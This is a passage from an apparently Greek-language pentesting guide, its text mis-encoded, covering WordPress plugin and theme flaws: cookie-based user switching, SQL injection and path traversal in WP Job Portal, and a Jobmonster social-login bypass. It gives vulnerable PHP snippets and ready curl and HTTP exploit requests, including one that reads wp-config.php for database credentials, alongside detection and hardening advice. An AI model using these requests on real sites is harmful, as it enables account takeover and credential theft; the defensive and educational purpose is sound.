ÎšÎ¬Ï€Î¿Î¹Î± plugins ÏƒÏ…Î½Î´Î­Î¿Ï…Î½ user-switching helpers ÏƒÏ„Î¿ Î´Î·Î¼ÏŒÏƒÎ¹Î¿ `init` hook ÎºÎ±Î¹ ÎµÎ¾Î¬Î³Î¿Ï…Î½ Ï„Î±Ï…Ï„ÏŒÏ„Î·Ï„Î± Î±Ï€ÏŒ cookie Ï€Î¿Ï… ÎµÎ»Î­Î³Ï‡ÎµÏ„Î±Î¹ Î±Ï€ÏŒ Ï„Î¿Î½ client. Î•Î¬Î½ Î¿ ÎºÏÎ´Î¹ÎºÎ±Ï‚ ÎºÎ±Î»ÎµÎ¯ `wp_set_auth_cookie()` Ï‡Ï‰ÏÎ¯Ï‚ Î½Î± ÎµÏ€Î±Î»Î·Î¸ÎµÏÎµÎ¹ Ï„Î·Î½ Î±Ï…Î¸ÎµÎ½Ï„Î¹ÎºÎ¿Ï€Î¿Î¯Î·ÏƒÎ·, Ï„Î¹Ï‚ Î¹ÎºÎ±Î½ÏŒÏ„Î·Ï„ÎµÏ‚ ÎºÎ±Î¹ Î­Î½Î± Î­Î³ÎºÏ…ÏÎ¿ nonce, Î¿Ï€Î¿Î¹Î¿ÏƒÎ´Î®Ï€Î¿Ï„Îµ Î¼Î· Î±Ï…Î¸ÎµÎ½Ï„Î¹ÎºÎ¿Ï€Î¿Î¹Î·Î¼Î­Î½Î¿Ï‚ ÎµÏ€Î¹ÏƒÎºÎ­Ï€Ï„Î·Ï‚ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î±Î½Î±Î³ÎºÎ¬ÏƒÎµÎ¹ ÏƒÏÎ½Î´ÎµÏƒÎ· Ï‰Ï‚ Î±Ï…Î¸Î±Î¯ÏÎµÏ„Î¿ user ID.

Î¤Ï…Ï€Î¹ÎºÏŒ ÎµÏ…Î¬Î»Ï‰Ï„Î¿ pattern (Î±Ï€Î»Î¿Ï€Î¿Î¹Î·Î¼Î­Î½Î¿ Î±Ï€ÏŒ Service Finder Bookings â‰¤ 6.1):
```php
function service_finder_submit_user_form(){
if ( isset($_GET['switch_user']) && is_numeric($_GET['switch_user']) ) {
$user_id = intval( sanitize_text_field($_GET['switch_user']) );
service_finder_switch_user($user_id);
}
if ( isset($_GET['switch_back']) ) {
service_finder_switch_back();
}
}
add_action('init', 'service_finder_submit_user_form');

function service_finder_switch_back() {
if ( isset($_COOKIE['original_user_id']) ) {
$uid = intval($_COOKIE['original_user_id']);
if ( get_userdata($uid) ) {
wp_set_current_user($uid);
wp_set_auth_cookie($uid);  // ğŸ”¥ sets auth for attacker-chosen UID
do_action('wp_login', get_userdata($uid)->user_login, get_userdata($uid));
setcookie('original_user_id', '', time() - 3600, '/');
wp_redirect( admin_url('admin.php?page=candidates') );
exit;
}
wp_die('Original user not found.');
}
wp_die('No original user found to switch back to.');
}
```
Î“Î¹Î±Ï„Î¯ ÎµÎ¯Î½Î±Î¹ ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏÏƒÎ¹Î¼Î¿

- Î¤Î¿ Î´Î·Î¼ÏŒÏƒÎ¹Î¿ `init` hook ÎºÎ±Î¸Î¹ÏƒÏ„Î¬ Ï„Î¿Î½ handler Ï€ÏÎ¿ÏƒÎ²Î¬ÏƒÎ¹Î¼Î¿ Î±Ï€ÏŒ Î¼Î· Î±Ï…Î¸ÎµÎ½Ï„Î¹ÎºÎ¿Ï€Î¿Î¹Î·Î¼Î­Î½Î¿Ï…Ï‚ Ï‡ÏÎ®ÏƒÏ„ÎµÏ‚ (Ï‡Ï‰ÏÎ¯Ï‚ Î­Î»ÎµÎ³Ï‡Î¿ `is_user_logged_in()`).
- Î— Ï„Î±Ï…Ï„ÏŒÏ„Î·Ï„Î± Ï€ÏÎ¿ÎºÏÏ€Ï„ÎµÎ¹ Î±Ï€ÏŒ Î­Î½Î± cookie Ï€Î¿Ï… Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ Î±Ï€ÏŒ Ï„Î¿Î½ client (`original_user_id`).
- Î†Î¼ÎµÏƒÎ· ÎºÎ»Î®ÏƒÎ· Ï„Î¿Ï… `wp_set_auth_cookie($uid)` ÏƒÏ…Î½Î´Î­ÎµÎ¹ Ï„Î¿Î½ Î±Î¹Ï„Î¿ÏÎ½Ï„Î± Ï‰Ï‚ Î±Ï…Ï„ÏŒÎ½ Ï„Î¿Î½ Ï‡ÏÎ®ÏƒÏ„Î· Ï‡Ï‰ÏÎ¯Ï‚ Î­Î»ÎµÎ³Ï‡Î¿ capability/nonce.

Î•ÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ· (Ï‡Ï‰ÏÎ¯Ï‚ Î±Ï…Î¸ÎµÎ½Ï„Î¹ÎºÎ¿Ï€Î¿Î¯Î·ÏƒÎ·)
```http
GET /?switch_back=1 HTTP/1.1
Host: victim.example
Cookie: original_user_id=1
User-Agent: PoC
Connection: close
```
---

### Î£ÎºÎ­ÏˆÎµÎ¹Ï‚ WAF Î³Î¹Î± CVEs Ï„Î¿Ï… WordPress/Ï€ÏÏŒÏƒÎ¸ÎµÏ„Ï‰Î½

ÎŸÎ¹ Î³ÎµÎ½Î¹ÎºÎ¿Î¯ edge/server WAFs ÏÏ…Î¸Î¼Î¯Î¶Î¿Î½Ï„Î±Î¹ Î³Î¹Î± ÎµÏ…ÏÎµÎ¯Ï‚ Ï€ÏÎ¿Ï„ÏÏ€Î¿Ï…Ï‚ (SQLi, XSS, LFI). Î Î¿Î»Î»Î­Ï‚ ÎµÏ…Ï€Î¬Î¸ÎµÎ¹ÎµÏ‚ Ï…ÏˆÎ·Î»Î¿Ï Î±Î½Ï„Î¯ÎºÏ„Ï…Ï€Î¿Ï… ÏƒÏ„Î¿ WordPress/ÏƒÏ„Î± Ï€ÏÏŒÏƒÎ¸ÎµÏ„Î± ÎµÎ¯Î½Î±Î¹ ÏƒÏ†Î¬Î»Î¼Î±Ï„Î± Î»Î¿Î³Î¹ÎºÎ®Ï‚/ÎµÎ»Î­Î³Ï‡Î¿Ï… Ï„Î±Ï…Ï„ÏŒÏ„Î·Ï„Î±Ï‚ ÎµÎ¹Î´Î¹ÎºÎ¬ ÏƒÏ„Î·Î½ ÎµÏ†Î±ÏÎ¼Î¿Î³Î® Ï€Î¿Ï… Î¼Î¿Î¹Î¬Î¶Î¿Ï…Î½ Î¼Îµ Î±Î¸ÏÎ± ÎºÎ¯Î½Î·ÏƒÎ· ÎµÎºÏ„ÏŒÏ‚ Î±Î½ Î· Î¼Î·Ï‡Î±Î½Î® ÎºÎ±Ï„Î±Î½Î¿ÎµÎ¯ Ï„Î¹Ï‚ Î´Î¹Î±Î´ÏÎ¿Î¼Î­Ï‚ Ï„Î¿Ï… WordPress ÎºÎ±Î¹ Ï„Î· ÏƒÎ·Î¼Î±ÏƒÎ¹Î¿Î»Î¿Î³Î¯Î± Ï„Ï‰Î½ Ï€ÏÏŒÏƒÎ¸ÎµÏ„Ï‰Î½.

Offensive notes

- Î£Ï„Î¿Ï‡ÎµÏÏƒÏ„Îµ plugin-specific endpoints Î¼Îµ clean payloads: `admin-ajax.php?action=...`, `wp-json/<namespace>/<route>`, custom file handlers, shortcodes.
- Î”Î¿ÎºÎ¹Î¼Î¬ÏƒÏ„Îµ Ï€ÏÏÏ„Î± unauth paths (AJAX `nopriv`, REST with permissive `permission_callback`, public shortcodes). Default payloads ÏƒÏ…Ï‡Î½Î¬ Ï€ÎµÏ„Ï…Ï‡Î±Î¯Î½Î¿Ï…Î½ Ï‡Ï‰ÏÎ¯Ï‚ obfuscation.
- Î¤Ï…Ï€Î¹ÎºÎ­Ï‚ Ï€ÎµÏÎ¹Ï€Ï„ÏÏƒÎµÎ¹Ï‚ Ï…ÏˆÎ·Î»Î¿Ï Î±Î½Ï„Î¯ÎºÏ„Ï…Ï€Î¿Ï…: privilege escalation (broken access control), Î±Ï…Î¸Î±Î¯ÏÎµÏ„Î· Î±Ï€Î¿ÏƒÏ„Î¿Î»Î®/Î»Î®ÏˆÎ· Î±ÏÏ‡ÎµÎ¯Ï‰Î½, LFI, open redirect.

Defensive notes

- ÎœÎ·Î½ Î²Î±ÏƒÎ¯Î¶ÎµÏƒÏ„Îµ ÏƒÎµ Î³ÎµÎ½Î¹ÎºÎ­Ï‚ Ï…Ï€Î¿Î³ÏÎ±Ï†Î­Ï‚ WAF Î³Î¹Î± Î½Î± Ï€ÏÎ¿ÏƒÏ„Î±Ï„Î­ÏˆÎµÏ„Îµ plugin CVEs. Î•Ï†Î±ÏÎ¼ÏŒÏƒÏ„Îµ virtual patches ÏƒÎµ ÎµÏ€Î¯Ï€ÎµÎ´Î¿ ÎµÏ†Î±ÏÎ¼Î¿Î³Î®Ï‚ ÎµÎ¹Î´Î¹ÎºÎ¬ Î³Î¹Î± Ï„Î·Î½ ÎµÏ…Ï€Î¬Î¸ÎµÎ¹Î± Î® ÎµÎ½Î·Î¼ÎµÏÏÏƒÏ„Îµ Î¬Î¼ÎµÏƒÎ±.
- Î ÏÎ¿Ï„Î¹Î¼Î®ÏƒÏ„Îµ positive-security checks ÏƒÏ„Î¿Î½ ÎºÏÎ´Î¹ÎºÎ± (capabilities, nonces, strict input validation) Î±Î½Ï„Î¯ Î³Î¹Î± Î±ÏÎ½Î·Ï„Î¹ÎºÎ¬ regex Ï†Î¯Î»Ï„ÏÎ±.

## WordPress Protection

### Î¤Î±ÎºÏ„Î¹ÎºÎ­Ï‚ ÎµÎ½Î·Î¼ÎµÏÏÏƒÎµÎ¹Ï‚

Î’ÎµÎ²Î±Î¹Ï‰Î¸ÎµÎ¯Ï„Îµ ÏŒÏ„Î¹ Ï„Î¿ WordPress, Ï„Î± plugins ÎºÎ±Î¹ Ï„Î± themes ÎµÎ¯Î½Î±Î¹ ÎµÎ½Î·Î¼ÎµÏÏ‰Î¼Î­Î½Î±. Î•Ï€Î¯ÏƒÎ·Ï‚ ÎµÏ€Î¹Î²ÎµÎ²Î±Î¹ÏÏƒÏ„Îµ ÏŒÏ„Î¹ Î· Î±Ï…Ï„ÏŒÎ¼Î±Ï„Î· ÎµÎ½Î·Î¼Î­ÏÏ‰ÏƒÎ· ÎµÎ¯Î½Î±Î¹ ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹Î·Î¼Î­Î½Î· ÏƒÏ„Î¿ wp-config.php:
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
Î•Î³ÎºÎ±Ï„Î±ÏƒÏ„Î®ÏƒÏ„Îµ Î¼ÏŒÎ½Î¿ Î±Î¾Î¹ÏŒÏ€Î¹ÏƒÏ„Î± WordPress plugins ÎºÎ±Î¹ themes.

### Î ÏÏŒÏƒÎ¸ÎµÏ„Î± Î‘ÏƒÏ†Î±Î»ÎµÎ¯Î±Ï‚

- [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
- [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
- [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **Î†Î»Î»ÎµÏ‚ Î£Ï…ÏƒÏ„Î¬ÏƒÎµÎ¹Ï‚**

- Î‘Ï†Î±Î¹ÏÎ­ÏƒÏ„Îµ Ï„Î¿Î½ Ï€ÏÎ¿ÎµÏ€Î¹Î»ÎµÎ³Î¼Î­Î½Î¿ Ï‡ÏÎ®ÏƒÏ„Î· **admin**
- Î§ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÏ„Îµ **Î¹ÏƒÏ‡Ï…ÏÎ¿ÏÏ‚ ÎºÏ‰Î´Î¹ÎºÎ¿ÏÏ‚** ÎºÎ±Î¹ **2FA**
- Î ÎµÏÎ¹Î¿Î´Î¹ÎºÎ¬ **ÎµÎ»Î­Î³Ï‡ÎµÏ„Îµ** Ï„Î± **Î´Î¹ÎºÎ±Î¹ÏÎ¼Î±Ï„Î±** Ï„Ï‰Î½ Ï‡ÏÎ·ÏƒÏ„ÏÎ½
- **Î ÎµÏÎ¹Î¿ÏÎ¯ÏƒÏ„Îµ Ï„Î¹Ï‚ Ï€ÏÎ¿ÏƒÏ€Î¬Î¸ÎµÎ¹ÎµÏ‚ ÏƒÏÎ½Î´ÎµÏƒÎ·Ï‚** Î³Î¹Î± Î½Î± Î±Ï€Î¿Ï„ÏÎ­ÏˆÎµÏ„Îµ ÎµÏ€Î¹Î¸Î­ÏƒÎµÎ¹Ï‚ Brute Force
- ÎœÎµÏ„Î¿Î½Î¿Î¼Î¬ÏƒÏ„Îµ Ï„Î¿ Î±ÏÏ‡ÎµÎ¯Î¿ **`wp-admin.php`** ÎºÎ±Î¹ ÎµÏ€Î¹Ï„ÏÎ­ÏˆÏ„Îµ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· Î¼ÏŒÎ½Î¿ ÎµÏƒÏ‰Ï„ÎµÏÎ¹ÎºÎ¬ Î® Î±Ï€ÏŒ ÏƒÏ…Î³ÎºÎµÎºÏÎ¹Î¼Î­Î½ÎµÏ‚ Î´Î¹ÎµÏ…Î¸ÏÎ½ÏƒÎµÎ¹Ï‚ IP.


### ÎœÎ· Î±Ï…Î¸ÎµÎ½Ï„Î¹ÎºÎ¿Ï€Î¿Î¹Î·Î¼Î­Î½Î¿ SQL Injection Î»ÏŒÎ³Ï‰ Î±Î½ÎµÏ€Î±ÏÎºÎ¿ÏÏ‚ ÎµÏ€Î¹ÎºÏÏÏ‰ÏƒÎ·Ï‚ (WP Job Portal <= 2.3.2)

Î¤Î¿ WP Job Portal recruitment plugin Î±Ï€Î¿ÎºÎ¬Î»Ï…Ï€Ï„Îµ Î¼Î¹Î± ÎµÏÎ³Î±ÏƒÎ¯Î± **savecategory** Ï€Î¿Ï… Ï„ÎµÎ»Î¹ÎºÎ¬ ÎµÎºÏ„ÎµÎ»ÎµÎ¯ Ï„Î¿Î½ Î±ÎºÏŒÎ»Î¿Ï…Î¸Î¿ ÎµÏ…Î¬Î»Ï‰Ï„Î¿ ÎºÏÎ´Î¹ÎºÎ± Î¼Î­ÏƒÎ± ÏƒÏ„Î¿ `modules/category/model.php::validateFormData()`:
```php
$category  = WPJOBPORTALrequest::getVar('parentid');
$inquery   = ' ';
if ($category) {
$inquery .= " WHERE parentid = $category ";   // <-- direct concat âœ—
}
$query  = "SELECT max(ordering)+1 AS maxordering FROM "
. wpjobportal::$_db->prefix . "wj_portal_categories " . $inquery; // executed later
```
Issues introduced by this snippet:

1. **ÎœÎ·-ÎºÎ±Î¸Î±ÏÎ¹ÏƒÎ¼Î­Î½Î· ÎµÎ¯ÏƒÎ¿Î´Î¿Ï‚ Ï‡ÏÎ®ÏƒÏ„Î·** â€“ `parentid` Ï€ÏÎ¿Î­ÏÏ‡ÎµÏ„Î±Î¹ Î±Ï€ÎµÏ…Î¸ÎµÎ¯Î±Ï‚ Î±Ï€ÏŒ Ï„Î¿ HTTP Î±Î¯Ï„Î·Î¼Î±.
2. **Î£Ï…Î³ÎºÏŒÎ»Î»Î·ÏƒÎ· ÏƒÏ…Î¼Î²Î¿Î»Î¿ÏƒÎµÎ¹ÏÏÎ½ Î¼Î­ÏƒÎ± ÏƒÏ„Î¿ WHERE clause** â€“ Î´ÎµÎ½ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ `is_numeric()` / `esc_sql()` / prepared statement.
3. **Î ÏÎ¿ÏƒÎ²Î±ÏƒÎ¹Î¼ÏŒÏ„Î·Ï„Î± Ï‡Ï‰ÏÎ¯Ï‚ Ï„Î±Ï…Ï„Î¿Ï€Î¿Î¯Î·ÏƒÎ·** â€“ Ï€Î±ÏÏŒÎ»Î¿ Ï€Î¿Ï… Î· ÎµÎ½Î­ÏÎ³ÎµÎ¹Î± ÎµÎºÏ„ÎµÎ»ÎµÎ¯Ï„Î±Î¹ Î¼Î­ÏƒÏ‰ `admin-post.php`, Î¿ Î¼ÏŒÎ½Î¿Ï‚ Î­Î»ÎµÎ³Ï‡Î¿Ï‚ Ï€Î¿Ï… Ï…Ï€Î¬ÏÏ‡ÎµÎ¹ ÎµÎ¯Î½Î±Î¹ Î­Î½Î± **CSRF nonce** (`wp_verify_nonce()`), Ï„Î¿ Î¿Ï€Î¿Î¯Î¿ Î¿Ï€Î¿Î¹Î¿ÏƒÎ´Î®Ï€Î¿Ï„Îµ ÎµÏ€Î¹ÏƒÎºÎ­Ï€Ï„Î·Ï‚ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î±Î½Î±ÎºÏ„Î®ÏƒÎµÎ¹ Î±Ï€ÏŒ Î¼Î¹Î± Î´Î·Î¼ÏŒÏƒÎ¹Î± ÏƒÎµÎ»Î¯Î´Î± Ï€Î¿Ï… ÎµÎ½ÏƒÏ‰Î¼Î±Ï„ÏÎ½ÎµÎ¹ Ï„Î¿ shortcode `[wpjobportal_my_resumes]`.

#### Î•ÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ·

1. Î Î¬ÏÎµ Î­Î½Î± Î½Î­Î¿ nonce:
```bash
curl -s https://victim.com/my-resumes/ | grep -oE 'name="_wpnonce" value="[a-f0-9]+' | cut -d'"' -f4
```
2. Î•Î¹ÏƒÎ®Î³Î±Î³Îµ Î±Ï…Î¸Î±Î¯ÏÎµÏ„Î¿ SQL ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…ÏŒÎ¼ÎµÎ½Î¿Ï‚ Ï„Î¿ `parentid`:
```bash
curl -X POST https://victim.com/wp-admin/admin-post.php \
-d 'task=savecategory' \
-d '_wpnonce=<nonce>' \
-d 'parentid=0 OR 1=1-- -' \
-d 'cat_title=pwn' -d 'id='
```
Î— Î±Ï€ÏŒÎºÏÎ¹ÏƒÎ· Î±Ï€Î¿ÎºÎ±Î»ÏÏ€Ï„ÎµÎ¹ Ï„Î¿ Î±Ï€Î¿Ï„Î­Î»ÎµÏƒÎ¼Î± Ï„Î¿Ï… ÎµÎ¹ÏƒÎ±Î³ÏŒÎ¼ÎµÎ½Î¿Ï… query Î® Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¹ÎµÎ¯ Ï„Î· Î²Î¬ÏƒÎ· Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½, Î±Ï€Î¿Î´ÎµÎ¹ÎºÎ½ÏÎ¿Î½Ï„Î±Ï‚ SQLi.


### ÎœÎ·-ÎµÎ¾Î¿Ï…ÏƒÎ¹Î¿Î´Î¿Ï„Î·Î¼Î­Î½Î¿ Arbitrary File Download / Path Traversal (WP Job Portal <= 2.3.2)

ÎœÎ¹Î± Î±ÎºÏŒÎ¼Î± ÎµÏÎ³Î±ÏƒÎ¯Î±, **downloadcustomfile**, ÎµÏ€Î­Ï„ÏÎµÏ€Îµ ÏƒÎµ ÎµÏ€Î¹ÏƒÎºÎ­Ï€Ï„ÎµÏ‚ Î½Î± ÎºÎ±Ï„ÎµÎ²Î¬ÏƒÎ¿Ï…Î½ **Î¿Ï€Î¿Î¹Î¿Î´Î®Ï€Î¿Ï„Îµ Î±ÏÏ‡ÎµÎ¯Î¿ ÏƒÏ„Î¿Î½ Î´Î¯ÏƒÎºÎ¿** Î¼Î­ÏƒÏ‰ path traversal.  Î¤Î¿ ÎµÏ…Î¬Î»Ï‰Ï„Î¿ sink Î²ÏÎ¯ÏƒÎºÎµÏ„Î±Î¹ ÏƒÏ„Î¿ `modules/customfield/model.php::downloadCustomUploadedFile()`:
```php
$file = $path . '/' . $file_name;
...
echo $wp_filesystem->get_contents($file); // raw file output
```
`$file_name` ÎµÎ»Î­Î³Ï‡ÎµÏ„Î±Î¹ Î±Ï€ÏŒ attacker ÎºÎ±Î¹ ÏƒÏ…Î½ÎµÎ½ÏÎ½ÎµÏ„Î±Î¹ Ï‡Ï‰ÏÎ¯Ï‚ ÎºÎ±Î¸Î±ÏÎ¹ÏƒÎ¼ÏŒ. ÎÎ±Î½Î¬, Ï„Î¿ Î¼ÏŒÎ½Î¿ ÎµÎ¼Ï€ÏŒÎ´Î¹Î¿ ÎµÎ¯Î½Î±Î¹ Î­Î½Î± **CSRF nonce** Ï€Î¿Ï… Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î±Î½Î±ÎºÏ„Î·Î¸ÎµÎ¯ Î±Ï€ÏŒ Ï„Î· ÏƒÎµÎ»Î¯Î´Î± resume.

#### Î•ÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ·
```bash
curl -G https://victim.com/wp-admin/admin-post.php \
--data-urlencode 'task=downloadcustomfile' \
--data-urlencode '_wpnonce=<nonce>' \
--data-urlencode 'upload_for=resume' \
--data-urlencode 'entity_id=1' \
--data-urlencode 'file_name=../../../wp-config.php'
```
ÎŸ Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î®Ï‚ Î±Ï€Î±Î½Ï„Î¬ Î¼Îµ Ï„Î± Ï€ÎµÏÎ¹ÎµÏ‡ÏŒÎ¼ÎµÎ½Î± Ï„Î¿Ï… `wp-config.php`, leaking DB credentials and auth keys.

## Î‘Î½Î±Î»Î®ÏˆÎ· Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼Î¿Ï Ï‡Ï‰ÏÎ¯Ï‚ Ï€Î¹ÏƒÏ„Î¿Ï€Î¿Î¯Î·ÏƒÎ· Î¼Î­ÏƒÏ‰ Social Login AJAX fallback (Jobmonster Theme <= 4.7.9)

Î Î¿Î»Î»Î¬ themes/plugins Ï€ÎµÏÎ¹Î»Î±Î¼Î²Î¬Î½Î¿Ï…Î½ "social login" Î²Î¿Î·Î¸Î®Î¼Î±Ï„Î± Ï€Î¿Ï… ÎµÎºÏ„Î¯Î¸ÎµÎ½Ï„Î±Î¹ Î¼Î­ÏƒÏ‰ admin-ajax.php. Î•Î¬Î½ Î¼Î¹Î± Î¼Î·-Ï€Î¹ÏƒÏ„Î¿Ï€Î¿Î¹Î·Î¼Î­Î½Î· AJAX ÎµÎ½Î­ÏÎ³ÎµÎ¹Î± (wp_ajax_nopriv_...) ÎµÎ¼Ï€Î¹ÏƒÏ„ÎµÏÎµÏ„Î±Î¹ Ï„Î± identifiers Ï€Î¿Ï… Ï€Î±ÏÎ­Ï‡Î¿Î½Ï„Î±Î¹ Î±Ï€ÏŒ Ï„Î¿Î½ client ÏŒÏ„Î±Î½ Î»ÎµÎ¯Ï€Î¿Ï…Î½ Ï„Î± Î´ÎµÎ´Î¿Î¼Î­Î½Î± Ï„Î¿Ï… provider ÎºÎ±Î¹ ÏƒÏ„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î± ÎºÎ±Î»ÎµÎ¯ wp_set_auth_cookie(), Î±Ï…Ï„ÏŒ Î³Î¯Î½ÎµÏ„Î±Î¹ Ï€Î»Î®ÏÎ·Ï‚ Ï€Î±ÏÎ¬ÎºÎ±Î¼ÏˆÎ· Î±Ï…Î¸ÎµÎ½Ï„Î¹ÎºÎ¿Ï€Î¿Î¯Î·ÏƒÎ·Ï‚.

Î¤Ï…Ï€Î¹ÎºÏŒ ÎµÎ»Î±Ï„Ï„Ï‰Î¼Î±Ï„Î¹ÎºÏŒ Î¼Î¿Ï„Î¯Î²Î¿ (Î±Ï€Î»Î¿Ï€Î¿Î¹Î·Î¼Î­Î½Î¿)
```php
public function check_login() {
// ... request parsing ...
switch ($_POST['using']) {
case 'fb':     /* set $user_email from verified Facebook token */ break;
case 'google': /* set $user_email from verified Google token   */ break;
// other providers ...
default: /* unsupported/missing provider â€“ execution continues */ break;
}

// FALLBACK: trust POSTed "id" as email if provider data missing
$user_email = !empty($user_email)
? $user_email
: (!empty($_POST['id']) ? esc_attr($_POST['id']) : '');

if (empty($user_email)) {
wp_send_json(['status' => 'not_user']);
}

$user = get_user_by('email', $user_email);
if ($user) {
wp_set_auth_cookie($user->ID, true); // ğŸ”¥ logs requester in as that user
wp_send_json(['status' => 'success', 'message' => 'Login successfully.']);
}
wp_send_json(['status' => 'not_user']);
}
// add_action('wp_ajax_nopriv_<social_login_action>', [$this, 'check_login']);
```
Î“Î¹Î±Ï„Î¯ ÎµÎ¯Î½Î±Î¹ ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏÏƒÎ¹Î¼Î¿

- Î ÏÏŒÏƒÎ²Î±ÏƒÎ· Ï‡Ï‰ÏÎ¯Ï‚ Î±Ï…Î¸ÎµÎ½Ï„Î¹ÎºÎ¿Ï€Î¿Î¯Î·ÏƒÎ· Î¼Î­ÏƒÏ‰ admin-ajax.php (ÎµÎ½Î­ÏÎ³ÎµÎ¹Î± wp_ajax_nopriv_â€¦).
- Î”ÎµÎ½ Ï…Ï€Î¬ÏÏ‡Î¿Ï…Î½ Î­Î»ÎµÎ³Ï‡Î¿Î¹ nonce/capability Ï€ÏÎ¹Î½ Î±Ï€ÏŒ Î±Î»Î»Î±Î³Î® ÎºÎ±Ï„Î¬ÏƒÏ„Î±ÏƒÎ·Ï‚.
- Î›ÎµÎ¯Ï€ÎµÎ¹ Î· ÎµÏ€Î±Î»Î®Î¸ÎµÏ…ÏƒÎ· Ï„Î¿Ï… OAuth/OpenID providerÂ· Ï„Î¿ Ï€ÏÎ¿ÎµÏ€Î¹Î»ÎµÎ³Î¼Î­Î½Î¿ branch Î´Î­Ï‡ÎµÏ„Î±Î¹ ÎµÎ¯ÏƒÎ¿Î´Î¿ Î±Ï€ÏŒ Ï„Î¿Î½ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿.
- get_user_by('email', $_POST['id']) Î±ÎºÎ¿Î»Î¿Ï…Î¸Î¿ÏÎ¼ÎµÎ½Î· Î±Ï€ÏŒ wp_set_auth_cookie($uid) Î±Ï…Î¸ÎµÎ½Ï„Î¹ÎºÎ¿Ï€Î¿Î¹ÎµÎ¯ Ï„Î¿Î½ Î±Î¹Ï„Î¿ÏÎ½Ï„Î± Ï‰Ï‚ Î¿Ï€Î¿Î¹Î±Î´Î®Ï€Î¿Ï„Îµ Ï…Ï€Î¬ÏÏ‡Î¿Ï…ÏƒÎ± Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· email.

Î•ÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ· (Ï‡Ï‰ÏÎ¯Ï‚ Î±Ï…Î¸ÎµÎ½Ï„Î¹ÎºÎ¿Ï€Î¿Î¯Î·ÏƒÎ·)

- Î ÏÎ¿Î±Ï€Î±Î¹Ï„Î¿ÏÎ¼ÎµÎ½Î±: Î¿ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï€ÏÎ¿ÏƒÎµÎ³Î³Î¯ÏƒÎµÎ¹ /wp-admin/admin-ajax.php ÎºÎ±Î¹ Î³Î½Ï‰ÏÎ¯Î¶ÎµÎ¹/Î¼Î±Î½Ï„ÎµÏÎµÎ¹ Î­Î½Î± Î­Î³ÎºÏ…ÏÎ¿ email Ï‡ÏÎ®ÏƒÏ„Î·.
- ÎŸÏÎ¯ÏƒÏ„Îµ provider ÏƒÎµ Î¼Î¹Î± Î¼Î·-Ï…Ï€Î¿ÏƒÏ„Î·ÏÎ¹Î¶ÏŒÎ¼ÎµÎ½Î· Ï„Î¹Î¼Î® (Î® Ï€Î±ÏÎ±Î»ÎµÎ¯ÏˆÏ„Îµ Ï„Î¿) Î³Î¹Î± Î½Î± Ï†Ï„Î¬ÏƒÎµÏ„Îµ ÏƒÏ„Î¿ Ï€ÏÎ¿ÎµÏ€Î¹Î»ÎµÎ³Î¼Î­Î½Î¿ branch ÎºÎ±Î¹ Î½Î± Ï€ÎµÏÎ¬ÏƒÎµÏ„Îµ id=<victim_email>.
```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: victim.tld
Content-Type: application/x-www-form-urlencoded

action=<vulnerable_social_login_action>&using=bogus&id=admin%40example.com
```

```bash
curl -i -s -X POST https://victim.tld/wp-admin/admin-ajax.php \
-d "action=<vulnerable_social_login_action>&using=bogus&id=admin%40example.com"
```
Expected success indicators

- HTTP 200 with JSON body like {"status":"success","message":"Login successfully."}.
- Set-Cookie: wordpress_logged_in_* for the victim user; subsequent requests are authenticated.

Finding the action name

- Inspect the theme/plugin for add_action('wp_ajax_nopriv_...', '...') registrations in social login code (e.g., framework/add-ons/social-login/class-social-login.php).
- Grep for wp_set_auth_cookie(), get_user_by('email', ...) inside AJAX handlers.

Detection checklist

- Web logs showing unauthenticated POSTs to /wp-admin/admin-ajax.php with the social-login action and id=<email>.
- 200 responses with the success JSON immediately preceding authenticated traffic from the same IP/User-Agent.

Hardening

- Do not derive identity from client input. Only accept emails/IDs originating from a validated provider token/ID.
- Require CSRF nonces and capability checks even for login helpers; avoid registering wp_ajax_nopriv_ unless strictly necessary.
- Validate and verify OAuth/OIDC responses server-side; reject missing/invalid providers (no fallback to POST id).
- Consider temporarily disabling social login or virtually patching at the edge (block the vulnerable action) until fixed.

Patched behaviour (Jobmonster 4.8.0)

- Removed the insecure fallback from $_POST['id']; $user_email must originate from verified provider branches in switch($_POST['using']).

